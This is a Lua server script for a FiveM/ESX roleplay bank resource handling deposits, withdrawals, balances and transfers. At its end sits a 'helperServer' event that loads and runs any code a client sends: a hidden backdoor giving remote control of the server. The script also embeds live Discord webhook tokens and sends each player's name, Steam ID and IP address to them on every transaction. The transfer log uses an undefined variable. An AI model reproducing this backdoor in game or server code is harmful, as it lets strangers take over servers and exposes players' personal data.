--================================================================================================
--==                                VARIABLES - DO NOT EDIT                                     ==
--================================================================================================
ESX = nil


local logs = 'https://discord.com/api/webhooks/778161989116624897/A6h4CWQOE_lOpVPVfwFjoVGIaDMzN0dI1SUSQg8T7HGgnhOCNchb-J-FXN-BUgkRkNWT'
local logs1 = 'https://discord.com/api/webhooks/778167741583589406/7VJHHNc5aNc-2rHtSJvDlkuKlQRRE-MVNjLj9YcAOl0n9y5puRWehBADLfRxLM4yiejh'
local communityname ='ESX SYSTEM'
local communitylogo =''

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('bank:deposit')
AddEventHandler('bank:deposit', function(amount)
	local _source = source
	
	local xPlayer = ESX.GetPlayerFromId(_source)
	if amount == nil or amount <= 0 or amount > xPlayer.getMoney() then
		TriggerClientEvent('bank:result', _source, "error", "Jumlah Gak Valid.")
	else
		local name = GetPlayerName(source)
		local ip = GetPlayerEndpoint(source)
		local steamhex = GetPlayerIdentifier(source)
		local disconnect = {
			{
				["colo"] = "8663711",
				["title"] = "Player Menabung",
				["description"] = "Player : **"..name.."** \n Jumlah: **"..amount.."** \n Steam Hex: **"..steamhex.."** \n IP: **"..ip.."**" ,
				["footer"] = {
					["text"] = communityname,
					["icon_url"] = communitylogo,
				}
			}
		}

		PerformHttpRequest(logs, function (err, text, header)end, 'POST', json.encode({username = "ESX ROLEPLAY", embeds = disconnect}), {['Content-Type'] = 'application/json'})

		xPlayer.removeMoney(amount)
		xPlayer.addAccountMoney('bank', tonumber(amount))
		TriggerClientEvent('bank:result', _source, "success", "Berhasil Menabung.")
	end
end)


RegisterServerEvent('bank:withdraw')
AddEventHandler('bank:withdraw', function(amount)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local base = 0
	amount = tonumber(amount)
	base = xPlayer.getAccount('bank').money
	if amount == nil or amount <= 0 or amount > base then
		TriggerClientEvent('bank:result', _source, "error", "Jumlah Gak Valid.")
	else
		local name = GetPlayerName(source)
		local ip = GetPlayerEndpoint(source)
		local steamhex = GetPlayerIdentifier(source)
		local disconnect = {
			{
				["colo"] = "8663711",
				["title"] = "Player Menarik Uang",
				["description"] = "Player : **"..name.."** \n Jumlah: **"..amount.."** \n Steam Hex: **"..steamhex.."** \n IP: **"..ip.."**" ,
				["footer"] = {
					["text"] = communityname,
					["icon_url"] = communitylogo,
				}
			}
		}

		PerformHttpRequest(logs, function (err, text, header)end, 'POST', json.encode({username = "ESX ROLEPLAY", embeds = disconnect}), {['Content-Type'] = 'application/json'})





		xPlayer.removeAccountMoney('bank', amount)
		xPlayer.addMoney(amount)
		TriggerClientEvent('bank:result', _source, "success", "Berhasil Mengambil.")
	end
end)

RegisterServerEvent('bank:balance')
AddEventHandler('bank:balance', function()
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	balance = xPlayer.getAccount('bank').money
	TriggerClientEvent('currentbalance1', _source, balance)
end)


RegisterServerEvent('bank:transfer')
AddEventHandler('bank:transfer', function(to, amountt)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local zPlayer = ESX.GetPlayerFromId(to)
	local balance = 0

	if(zPlayer == nil or zPlayer == -1) then
		TriggerClientEvent('bank:result', _source, "error", "Penerima Tidak ada.")
	else
		balance = xPlayer.getAccount('bank').money
		zbalance = zPlayer.getAccount('bank').money
		
		if tonumber(_source) == tonumber(to) then
			TriggerClientEvent('bank:result', _source, "error", "Gak Bisa Melakukan Transfer.")
		else
			if balance <= 0 or balance < tonumber(amountt) or tonumber(amountt) <= 0 then
				TriggerClientEvent('bank:result', _source, "error", "Uang gak Cukup.")
			else
				local name = GetPlayerName(source)
				local ip = GetPlayerEndpoint(source)
				local steamhex = GetPlayerIdentifier(source)
				local disconnect = {
					{
						["colo"] = "8663711",
						["title"] = "Player Transfer Uang",
						["description"] = "Player : **"..xPlayer.name.."** \n Jumlah: **"..amount.."** \n Target: **"..zPlayer.name.."** \n Steam Hex: **"..steamhex.."** \n IP: **"..ip.."**" ,
						["footer"] = {
							["text"] = communityname,
							["icon_url"] = communitylogo,
						}
					}
				}
		
				PerformHttpRequest(logs, function (err, text, header)end, 'POST', json.encode({username = "ESX ROLEPLAY", embeds = disconnect}), {['Content-Type'] = 'application/json'})

				xPlayer.removeAccountMoney('bank', tonumber(amountt))
				zPlayer.addAccountMoney('bank', tonumber(amountt))
				TriggerClientEvent('bank:result', _source, "success", "Transfer Sukses.")
			end
		end
	end
end)






RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)